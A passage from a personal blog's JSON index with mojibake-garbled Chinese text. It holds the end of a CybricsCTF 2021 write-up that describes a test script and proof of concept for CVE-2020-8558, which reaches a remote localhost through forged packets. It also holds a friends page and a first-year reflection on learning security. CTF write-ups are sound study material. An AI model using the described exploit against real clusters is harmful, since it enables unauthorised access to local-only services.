CVE-2020-8558.\nï¼ˆä¸å¾—ä¸è¯´ipv4å½“åˆæŠŠæ•´ä¸ª127.0.0.0/8çš„åœ°å€éƒ½ç»™äº†æœ¬åœ°å›ç¯ç”¨çœŸçš„æ˜¯å¤ªæ…·æ…¨äº†\u0026hellip;\u0026hellip; åˆ°ipv6å°±åªæœ‰ä¸€ä¸ª:: 1\nåœ¨è¿™é‡Œç›´æ¥ç”¨pocæ‰“å³å¯ï¼Œå…³äºtest.pyå’Œpoc.pyè¿™é‡Œä¹Ÿæ‘˜å–ä¸€ä¸‹è¯´æ˜\ntst-2020-8558.py Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to 127.0.0.1 via your target, and looks to see if there is a reply.\npoc-2020-8558.py Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default). Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal. Because this script uses raw sockets to send and receive the \u0026ldquo;localhost\u0026rdquo; packets, it works fine inside a normal unprivileged container.\nå› ä¸ºéœ€è¦nc æ‰€ä»¥å¦å¼€ä¸€ä¸ªshell\nå‚è€ƒï¼šwp | ä¸ºä»€ä¹ˆæ•´ä¸ª127.*ç½‘æ®µéƒ½è¢«æ‹¿æ¥å½“åšç¯å›åœ°å€äº†ï¼Ÿ\næœ¬äººæ¯”è¾ƒèœï¼Œåªåšå‡ºæ¥äº†ç­¾åˆ°é¢˜å’Œå‡ ä¸ªwebï¼Œå…¶ä½™å‡ä¸ºèµ›åå¤ç›˜ï¼Œæ­¤å¤„æ˜¯å‚è€ƒwp\né“é˜»ä¸”é•¿å‘€ï¼Œæš‘å‡è¦å¥½å¥½åŠªåŠ›å’¯ (ã¤Ğ´âŠ‚) å‚ç…§ä¸€äº›æ•™ç¨‹æŠŠç®€å•çš„åšå®¢ä¹Ÿæ­èµ·æ¥äº†ï¼Œä»¥åè¦æŠŠè¿™ä¸ªå°çªæ…¢æ…¢ä¸°å¯Œèµ·æ¥(ã‚âˆ€ï½¥)â˜†\n","date":"2021-07-29T17:02:12+08:00","permalink":"https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/","section":"posts","tags":["wp"],"title":"CybricsCTF2021 Wp"},{"categories":[],"contents":"æ¬¢è¿äº’æ¢å‹é“¾ï¼ï¼æ¬¢è¿æ‰©åˆ—å¹æ°´ï¼ï¼!\ná••(á›)á•—\nscr1pt - V\u0026amp;N - misc/reverse - å‘œå‘œå‘œæ˜¯å…¨æ ˆçˆ· T1p3 - web/misc D3n13d - web eeee - V\u0026amp;N - pwn - çŸ¥åç”·é…® deebato - V\u0026amp;N - crypto PoZeep - V\u0026amp;N - reverse dem0 - V\u0026amp;N - web ","date":"2021-07-27T14:37:22+08:00","permalink":"https://amiaaaz.github.io/friends/","section":"","tags":[],"title":"Friends"},{"categories":[],"contents":"æ—¶é—´é£é€ï¼Œä¸€çœ¨çœ¼è¿›å…¥å¤§å­¦å·²ç»å¿«ä¸€å¹´äº†ï¼Œä½†æ—¶å¸¸è§‰å¾—æŠ¥é“å…¥æ ¡å°±åœ¨æ˜¨å¤©ã€‚\nå»å¹´12æœˆå¼€å§‹æ¥è§¦åˆ°ctfï¼Œ0åŸºç¡€ï¼Œæ¯å‘¨æœ«åšä¸€åšctfhubçš„æŠ€èƒ½æ ‘ï¼Œå½“æ—¶å¯¹æ•´ä¸ªè®¡ç®—æœºä¸–ç•Œç®—æ˜¯å®Œå…¨å°ç™½ é‡åˆ°ä¸€ä¸ªåè¯å°±è¦æŸ¥ä¸€æŸ¥ä»€ä¹ˆæ„æ€ï¼Œç»å¸¸æ˜¯çœ‹ä¸ªåŠå¤©è¿˜æ˜¯ä¸€çŸ¥åŠè§£ï¼Œåšé¢˜ä¹Ÿåªèƒ½æœºæ¢°çš„é‡å¤ä¸€ä¸‹æœåˆ°çš„wpé‡Œçš„æ­¥éª¤ï¼Œæœ‰æ ·å­¦æ ·ã€‚ä¹Ÿå°±åšæŒäº†1ä¸ªæœˆï¼Œå°±å¼€å§‹å¤ä¹ æœŸæœ«è€ƒè¯•â†’è€ƒè¯•â†’æ”¾å‡ï¼Œå¯’å‡ç®—æ˜¯åœ¨å®¶é‡Œèººè¿‡å»çš„ï¼Œæ¯å¤©å®…ç€çœ‹çœ‹å‰§ åˆ·åˆ·æ‰‹æœºï¼Œç¢Œç¢Œæ— ä¸ºçš„ä»€ä¹ˆéƒ½ä¸æƒ³å¹²ï¼›ä¸´è¿‘å¼€å­¦äº†ï¼Œæ‰å¦‚æ¢¦åˆé†’èˆ¬çš„æ‚”æ‚Ÿï¼Œçœ‹äº†ä¸¤æœ¬ä¹¦ï¼Œæ£é¼“äº†ä¸‹æ‰‹æœºï¼Œæµ…æµ…åœ°äº†è§£äº†ä¸€ä¸‹å®‰å“çš„åˆ·æœºå’Œææœºçš„ç›¸å…³çŸ¥è¯†ã€‚\nä¸‰æœˆåº•æ­£å¼å¼€å­¦ï¼Œå››æœˆåˆå¼€å§‹æŠŠâ€œè’åºŸâ€çš„ctfé¢˜ç»§ç»­æ¡èµ·æ¥ï¼Œä»ä¹‹å‰çš„æ¯å‘¨æœ«åšåšé¢˜å˜æˆäº†æ¯å¤©æ™šä¸Šéƒ½æ‹¿å‡ºæ—¶é—´æ¥å­¦ä¹ ã€‚å½“æ—¶è™½ç„¶å¯¹å®‰å…¨è¿˜æ˜¯æ‡µæ‡‚çš„è®¤è¯†ï¼Œä½†æ˜¯æˆ‘çš„ç›´è§‰å‘Šè¯‰æˆ‘è¿™å°±æ˜¯æˆ‘çš„çˆ±å¥½ï¼Œæ˜¯èƒ½å¸¦æ¥æˆå°±æ„Ÿå’Œå¿«ä¹çš„ä¸œè¥¿ï¼Œæˆ‘æ„¿æ„èŠ±æ—¶é—´å»ç¢ç£¨å®ƒã€‚ä¹Ÿæ˜¯å››æœˆï¼Œçœ‹äº†ã€Šç½‘ç»œæ˜¯æ€æ ·è¿æ¥çš„ã€‹ã€Šå›¾è§£httpã€‹å’Œã€Šå›¾è§£tcp/ipã€‹ï¼Œæ­£å¼çš„äº†è§£äº†ä¸€ä¸‹è®¡ç½‘ï¼ˆè™½ç„¶ä¹Ÿåªæ˜¯ä¸ªå…¥é—¨ï¼‰ï¼›åšå®Œctfhubçš„webéƒ¨åˆ†ä¹‹åï¼Œä¹Ÿç®—æ˜¯å¯¹ctfé‡Œwebéƒ¨åˆ†çš„åŸºæœ¬ç±»å‹éƒ½è§è¿‡äº†ï¼Œå¼€å§‹åœ¨buuojä¸ŠçœŸæ­£åšä¸€äº›ctfçš„é¢˜ã€‚\nç„¶è€Œåˆ°çœŸæ­£åˆ°åšctfé¢˜çš„æ—¶å€™å‘ç°è‡ªå·±åˆæ˜¯é‚£æ ·çš„æ¸ºå°ï¼Œæ‹¿åˆ°ä¸€é“é¢˜ä¹Ÿåªèƒ½æŠ“åŒ…ã€æ‰«ç›®å½•ï¼Œå¥½ä¸€ç‚¹çš„èƒ½æ‹¿åˆ°æ³„éœ²çš„æºç ï¼Œå¯æ˜¯åˆ°ä»£ç å®¡è®¡åˆæ˜¯å®Œå…¨çš„ç¨€çƒ‚ï¼Œjsä¸ä¼šçœ‹ phpä¸ä¼šçœ‹ javaæ›´ä¸ä¼šçœ‹ï¼Œç”šè‡³è¿å¤æ‚ä¸€ç‚¹çš„pythonä¹Ÿä¸ä¼šçœ‹ï¼Œä¸€ä¸ªç±»å‹çš„é¢˜ ç¨å¾®å˜ä¸ªèŠ±æ · æ‹ä¸ªå¼¯å°±åˆçœ‹ä¸æ‡‚äº†ï¼Œä¸€å‰¯ç—›è‹¦é¢å…·ï¼›ç°åœ¨å›è¿‡å¤´æ¥çœ‹ å¾ˆåº†å¹¸å½“æ—¶å³ä½¿é‡åˆ°äº†ç§ç§é—®é¢˜ä¹Ÿæ²¡æ‰“é€€å ‚é¼“ï¼Œæ²¡è§è¿‡çš„å‡½æ•°å°±å»æœæ–‡æ¡£ çœ‹ç”¨æ³•ï¼Œæ²¡è§è¿‡çš„çŸ¥è¯†ç‚¹å°±å»æœç›¸å…³èµ„æ–™ï¼Œçœ‹ä¸æ‡‚çš„é¢˜å°±å¤šçœ‹å‡ ä¸ªä¸åŒçš„wp ç„¶åå¤ç° ç”¨è‡ªå·±çš„è¯å†æ•´ç†å‡ºæ¥ æ‰“å¥½tagæ”¾åˆ°notionä¸Šã€‚\nå¾ˆå¿«åˆ°äº†äº”æœˆï¼Œäº”æœˆåˆæŠŠè€æ—§åšé‡çš„ç”µè„‘æ¢æ‰äº†ï¼Œæ–°ä¸Šæ‰‹çš„è£…å¤‡æå‡äº†ä¸å°‘å­¦ä¹ çš„èˆ’é€‚æ„Ÿï¼›è¿™æ®µæ—¶é—´ä¹Ÿå¤¹æ‚ç€åšäº†ä¸€ç‚¹burpsuite portswiggerçš„é¢˜ï¼ˆè¿™å—åšçš„ä¸å¤ªæ‰å®ï¼Œè€Œä¸”å½“æ—¶åšçš„æ—¶å€™æ²¡æœ‰ç”¨å›¾åºŠ ç¬”è®°é‡Œçš„å›¾ç‰‡ä¹Ÿéƒ½ä¸¢æ‰äº† ä¹‹åå¾—å›è¿‡å¤´æ¥é‡æ–°çœ‹çœ‹ï¼‰ï¼Œä¹Ÿå¤¹æ‚åšäº†å‡ ä¸ªå•ç‹¬ç±»å‹çš„é¶åœºï¼›ç„¶åæ˜¯ä¸¤å‘¨éš¾ç†¬çš„å†›è®­ã€‚è™½ç„¶å†›è®­éš¾ç†¬ï¼Œä½†æ˜¯è¿‡çš„çœŸçš„å¾ˆå¿«ä¹ã€‚è¿™é‡Œå°±æ˜¯æ‡‚çš„éƒ½æ‡‚äº†ï¼Œä¸è¯¦è¯´ã€‚å¼€å¿ƒå¿«ä¹çš„å‡ ä¸ªæœˆï¼Œæˆ‘å°†æ°¸è¿œé“­è®°ã€‚\nå†›è®­å›æ¥ä»¥åå°±å…­æœˆäº†ï¼Œç®—æ˜¯è¿›å…¥æ­£è½¨ï¼Ÿä¸çŸ¥é“è¿™æ ·è¯´æ˜¯ä¸æ˜¯å¾ˆåˆé€‚ï¼Œå¯¹å¾ˆå¤šé¢˜ç›®ä¹Ÿæ˜¯ä¸€å›ç”Ÿ äºŒå›ç†Ÿï¼Œä»ä¸€å¼€å§‹çš„å®Œå…¨ä¸çŸ¥é“ä»å“ªé‡Œä¸‹æ‰‹åˆ°ç¨å¾®èƒ½åˆ†æä¸€ç‚¹ï¼ˆè™½ç„¶è¿˜æ˜¯ä¸èƒ½è„±ç¦»wpç‹¬è‡ªè¡Œèµ°ï¼‰ï¼Œå¯èƒ½å¯¹äºä¸€äº›æœ‰å¤©èµ‹çš„å¤§ä½¬æ¥è¯´è¿™äº›è½»è½»æ¾æ¾ï¼Œæˆ‘å¯èƒ½èŠ±å‡ ä¸ªå°æ—¶èƒ½ææ‡‚çš„ä¸œè¥¿åªéœ€è¦åˆ«äººä¸€ä¸ªå°æ—¶èƒ½ç†è§£é€ï¼Œä½†æ˜¯æˆ‘å·²ç»å¾ˆæ»¡æ„äº†ï¼Œé‚£å¥è¯æ€ä¹ˆè¯´ï¼Ÿâ€œè¿›ä¸€å¯¸æœ‰ä¸€å¯¸çš„æ¬¢å–œâ€ï¼Œæˆ–è®¸å°±æ˜¯è¿™æ ·å§ï¼Œè™½ç„¶æ¯å¤©æ˜¯ç¬¨æ‹™åœ°å­¦ç€ï¼Œä½†ä¹Ÿå¼€å¿ƒã€‚\nä¹Ÿæ˜¯å…­æœˆä¹‹åï¼Œå¼€å§‹å…³æ³¨æ¼æ´ã€æ¸—é€ã€æ”»é˜²ç­‰ç­‰å®‰å…¨æ–¹é¢æ ¸å¿ƒå‘çš„ä¸€äº›ä¸œè¥¿ï¼Œå¼€å§‹æ¯å¤©æŠ½å‡ºæ—¶é—´çœ‹å®‰å…¨ç±»çš„å…¬ä¼—å·æ–‡ç« ï¼Œä¸€å¼€å§‹åªæ˜¯ä¸æ˜è§‰å‰â€”â€”å“‡ è™½ç„¶çœ‹ä¸æ‡‚æ˜¯åœ¨å¹²ä»€ä¹ˆ ä½†æ˜¯å¥½nb å¥½å‰å®³ï¼Œçœ‹çš„å¤šäº†ä¸€ç‚¹ä»¥åå¼€å§‹æ…¢æ…¢æ˜ç™½é‚£äº›é«˜å¤§ä¸Šçš„åè¯æ˜¯ä»€ä¹ˆæ„æ€ï¼ŒåŸæ¥ç½‘ç»œå®‰å…¨çš„ä¸–ç•Œæ˜¯é‚£ä¹ˆè®©äººç€è¿·ã€‚ä¹Ÿå¼€å§‹æ­£å¼æ¥è§¦ctfæ¯”èµ›ï¼ˆè™½ç„¶ä¹Ÿå°±æ˜¯è¿›å»ç­¾ä¸ªåˆ°çš„æ°´å¹³â€¦â€¦ï¼‰ï¼Œå¼€å§‹åšvulnhubçš„é¶æœºï¼Œå¼€å§‹å¤ç›˜ä¹‹å‰åšè¿‡çš„é¢˜ï¼Œæ…¢æ…¢çš„ æ—å¾åšå¼• ä¸€ç‚¹ç‚¹çš„ä¸°å¯ŒçŸ¥è¯†ä½“ç³»ã€‚\nç°åœ¨å·²ç»æ˜¯7æœˆä¸­æ—¬äº†ï¼Œå¾ˆå¿«å°±è¦ä»å¤§ä¸€çš„èœé¸¡å˜ä¸ºå¤§äºŒçš„èœé¸¡äº†ï¼Œå›é¡¾è¿™ä¸€å¹´çš„å­¦ä¹ å’Œç”Ÿæ´»ä¹Ÿæ˜¯æ„Ÿæ…¨è‰¯å¤šã€‚æ»¡æ‰“æ»¡ç®—ï¼Œæ¥è§¦å®‰å…¨æ˜¯ä¸åˆ°å››ä¸ªæœˆå§ï¼Œç®—æ˜¯ä¹Ÿä¸çŸ­äº†ï¼Œå¯æ˜¯è®¤çœŸæ‹ä¸€ä¸‹æ•´ä¸ªçš„è¿‡ç¨‹ åˆæ˜¯æ¼æ´ç™¾å‡ºâ€”â€”ä»£ç å®¡è®¡èƒ½åŠ›ç¨€çƒ‚ï¼Œç»å¸¸åˆ†æä¸å‡ºæ¥é—®é¢˜æ‰€åœ¨çš„åœ°æ–¹ï¼›é€»è¾‘é“¾æ¡ä¸€é•¿çš„é¢˜ç›®å°±æ€ç»´å‘†æ» æ€»æ˜¯ä¼šä¸‹æ„è¯†åœ°æƒ³æ”¾å¼ƒ è¿™çœŸçš„ä¸æ˜¯ä¸ªå¥½ç°è±¡ï¼›sqliå’Œuploadç±»çš„é¢˜åšäº†ä¸å°‘ï¼Œä½†è¿˜æ˜¯ä¸èƒ½è‡ªå·±ç‹¬ç«‹çš„ å®Œå…¨ä¸å‚è€ƒåˆ«äººçš„wpå®Œæˆä¸€æ•´ä¸ªåˆ†æè¿‡ç¨‹ï¼›å¯¹äºpythonçš„æŒæ¡ä¸å¤Ÿå¥½ï¼Œæ˜æ˜¾ååº”åœ¨ä»»ä½•éœ€è¦ç¼–å†™pyè„šæœ¬çš„é¢˜ç›®ä¸Šï¼›å¯¹ä¸€äº›çŸ¥è¯†ç‚¹â€”â€”ä¸è¯´ä¸€äº›äº†ï¼Œå¯ä»¥è¯´æ˜¯å…¨éƒ¨çš„ä¸œè¥¿çš„äº†è§£å’Œè®¤è¯†éƒ½è¿˜æ˜¯æµ…å°è¾„æ­¢ï¼Œåœç•™åœ¨çº¸é¢ä¸Šçš„èŠ±æ¶å­ï¼Œæ¯”å¦‚ååºåˆ—åŒ– æ¯”å¦‚ç›®å½•éå†ï¼Œè„‘å­é‡Œåªèƒ½è¯´æœ‰ä¸ªæ®‹å­˜çš„å°è±¡ å¯çœŸæ­£ç»™æˆ‘ä¸ªè¿™æ ·çš„é¢˜ è¿˜æ˜¯ä¸èƒ½è¯´è½»æ¾ä¸Šæ‰‹ï¼Œç”šè‡³æ˜¯å¯¹ä¸€äº›æ¦‚å¿µè¿˜ç†ä¸æ¸…æ¥šï¼Œå­¦çš„ä¸œè¥¿å¯èƒ½çœ‹èµ·æ¥æ˜¯æœ‰ä¸ªæ ·å­ ä½†æˆ‘å¿ƒé‡Œæ¸…æ¥š å·®çš„è¿˜å¤ªè¿œå¤ªè¿œï¼Œç”šè‡³å®Œå…¨æ²¡æœ‰åˆ°èƒ½è‡ªä¿¡çš„è·Ÿåˆ«äººè¯´â€œæˆ‘åœ¨å­¦ctf æˆ‘åœ¨å­¦å®‰å…¨â€çš„ç¨‹åº¦ã€‚\nå­¦ä¸åŠ¨çš„æ—¶å€™ç»å¸¸ä¼šçœ‹å¤§ä½¬çš„åšå®¢ï¼Œçœ‹çœ‹åˆ«äººçš„å­¦ä¹ ç»å†æ˜¯ä»€ä¹ˆæ ·çš„ã€‚ä¹‹å‰è¿˜ä¼šæ‹¿å¹´é¾„åšè‡ªæˆ‘å¼€è„±çš„å€Ÿå£ï¼Œè¿˜å°ï¼Œè¿˜æ—©ï¼Œè¿˜éƒ½æ¥å¾—åŠï¼Œå¯æ˜¯è¶Šå­¦ è¶Šå‘ç°è¦å»ç‚¹äº®çš„æŠ€èƒ½æ ‘è¶Šæ˜¯æç¹å¶èŒ‚ï¼Œåšåšçš„æ ‘å† ä»¿ä½›è¦é®å¤©è”½æ—¥èˆ¬â€”â€”è¦å­¦java æé«˜ä»£ç å®¡è®¡èƒ½åŠ› å¸¸è§çš„æ¼æ´ç±»å‹è¦åšåˆ°å¿ƒé‡Œæœ‰æ•°ï¼Œè¦æŠŠä¹‹å‰åšè¿‡çš„é¢˜å¤šæ¸©ä¹  å¤šæƒ³å¤šç»ƒå¤šçœ‹ï¼Œè¦åšåˆ°çœŸæ­£çš„æŒæ¡çŸ¥è¯† è€Œä¸æ˜¯è®°ä½è¿™ä¸ªä¸œè¥¿å«ä»€ä¹ˆ å¾’æœ‰å…¶è¡¨ï¼Œè¦å¤šå†™å†™ä»£ç  å†™ä»£ç çš„åŸºæœ¬åŠŸå¤ªå·®é‚£è‚¯å®šæ˜¯èµ°ä¸è¿œï¼Œæœ€æ„Ÿå…´è¶£çš„æ¸—é€å’Œæ¼æ´æ–¹é¢çš„ä¸œè¥¿æ›´è¦å¤šçœ‹ å¯ä»¥æœ¬åœ°å¤ç°çš„ä¸è¦æ‡’ï¼›å³ä¾¿å¦‚æ­¤ï¼Œä¹Ÿæœ‰ä¸å°‘é˜³å…‰èƒ½å¤Ÿç©¿é€æ ‘å¶äº¤å ä¹‹å¤„ï¼Œæ¸©æš–çš„æ´’è½ã€‚å¯èƒ½æˆ‘çœŸçš„ä¸æ˜¯æ‰€è°“çš„å¤©èµ‹å‹é€‰æ‰‹ï¼Œåªä¸è¿‡æ˜¯ä¸‡åƒå¹³å¹³æ— å¥‡çš„æ™®é€šäººä¹‹ä¸€ï¼Œå­¦ä¹ èƒ½åŠ›ä¹Ÿå°±æ˜¯ä¸ªä¸­ç­‰æ°´å¹³ï¼Œä½†æ˜¯æˆ‘ç›¸ä¿¡é‡å˜å¼•èµ·è´¨å˜ï¼Œç›¸ä¿¡æŒä¹‹ä»¥æ’çš„åŠªåŠ›ä¼šå¸¦æ¥æ”¹å˜ï¼Œæ›´ä½•å†µè¿™è¿˜æ˜¯æˆ‘éå¸¸å–œæ¬¢çš„äº‹æƒ…ï¼›å¯èƒ½æˆ‘å³ä½¿åŠªåŠ›å››å¹´ ä¹Ÿè¾¾ä¸åˆ°é‚£äº›å¤§ä½¬åŠå¹´å°±èƒ½è¾¾åˆ°çš„é«˜åº¦ï¼Œä½†æ˜¯ä¸é‡è¦ å­¦ä¹ å˜› å°±æ˜¯ä¸ä¼šæ‰è¦å­¦ï¼Œå°±ç®—å­¦ä¸ä¼šä¹Ÿä¸æ˜¯ä»€ä¹ˆä¸¢äººçš„äº‹æƒ…ï¼Œæ—¥æ‹±ä¸€å’ï¼ŒåŠŸä¸å”æã€‚\nå†ä¸€æŠ¬çœ¼ï¼Œæš‘å‡å°±è¦æ¥äº†ã€‚è¦å¹²çš„å’Œè¦å­¦çš„å¾ˆå¤šï¼Œåƒå¤´ä¸‡ç»ªçš„ï¼›ä½†ä¹Ÿç®—æ˜¯æœ‰æ˜ç¡®çš„æ–¹å‘ï¼Œäººè¿˜æ˜¯å¿™èµ·æ¥å¥½ã€‚ä¸‹å­¦æœŸå°±å¤§äºŒäº†ï¼Œå†ä¸€æ™ƒå°±å¤§ä¸‰äº†ï¼Œè‡ªå·±æ˜¯ä¸æƒ³è€ƒç ”çš„ï¼Œä½†æ˜¯åˆ°äº†å¤§å›› è‡ªå·±çš„å®åŠ›å¤Ÿè¿›å¤§å‚å—ï¼Ÿä¼šä¸ä¼šæ¯•ä¸šå³å¤±ä¸šï¼Ÿæˆ‘ä¸çŸ¥é“ï¼Œä½†è°åˆçŸ¥é“å‘¢ï¼Ÿæœªæ¥çš„äº‹æƒ…é¢„æµ‹ä¸äº†ï¼Œèƒ½åšçš„åªæœ‰æŠŠæ¡å½“ä¸‹ã€‚\nå¤§ä¸€å°±è¦ç»“æŸäº†ï¼Œåœ¨å›¾ä¹¦é¦†å¸¸åçš„åº§ä½ä¸Šï¼Œæ‰“å¼€typoraï¼Œè‰è‰çš„å¤ç›˜äº†ä¸€ä¸‹æ•´ä¸ªä¸€å­¦å¹´ã€‚ä¸Šä¸€æ¬¡å†™å¤ç›˜æ€»ç»“è¿˜æ˜¯å…­æœˆåˆ åˆšå†›è®­å®Œï¼Œä¸€ä¸ªæœ‰ç‚¹è¿·èŒ«çš„æ—¶å€™ã€‚å¦‚æœè·Ÿ0åŸºç¡€çš„è‡ªå·±æ¯”èµ·æ¥ï¼Œå¯ä»¥è¯´æ˜¯æˆé•¿äº†ä¸å°‘ï¼›ä½†æˆ‘çŸ¥é“è¿™è¿˜è¿œè¿œè¾¾ä¸åˆ°å¹³å‡çº¿ï¼Œå·®çš„è¿˜å¤ªå¤šï¼Œæ˜¯å®Œå…¨æ‹¿ä¸å‡ºæ‰‹çš„ç¨‹åº¦ã€‚ä½†æ€»çš„æ¥è¯´ï¼Œè¿˜ç®—æœ‰ä¸€ç‚¹ç‚¹å°å°çš„æ”¶è·ï¼Œå¸Œæœ›è‡ªå·±åœ¨ä¹‹åçš„æ—¥å­é‡Œä¹Ÿèƒ½åšå®ˆä½åˆå¿ƒï¼Œä¿æŒå¯¹å®‰å…¨çš„çƒ­çˆ±ï¼Œä¿æŒå­¦ä¹ çš„çƒ­æƒ…ï¼Œä¹Ÿä¿æŒå¯¹ç¾å¥½ç”Ÿæ´»çš„çƒ­å¿±ï¼›å¸Œæœ›èƒ½å¤Ÿå˜å¾—è¶Šæ¥è¶Šå¼ºå¤§ï¼›å¸Œæœ›å¤§äºŒçš„å¯’å‡å†™å¤ç›˜æ€»ç»“çš„æ—¶å€™èƒ½æœ‰æ›´å¤šå¯å†™çš„ æ›´å¤šå¼€å¿ƒçš„äº‹æƒ…ã€‚\nï¼šï¼‰\n","date":"2021-07-22T18:27:39+08:00","permalink":"https://amiaaaz.github.io/life/0920-0721-summary/","section":"life","tags":[],"title":"ä¸€ç‚¹å°å°çš„æ€»ç»“ï¼ˆ"}]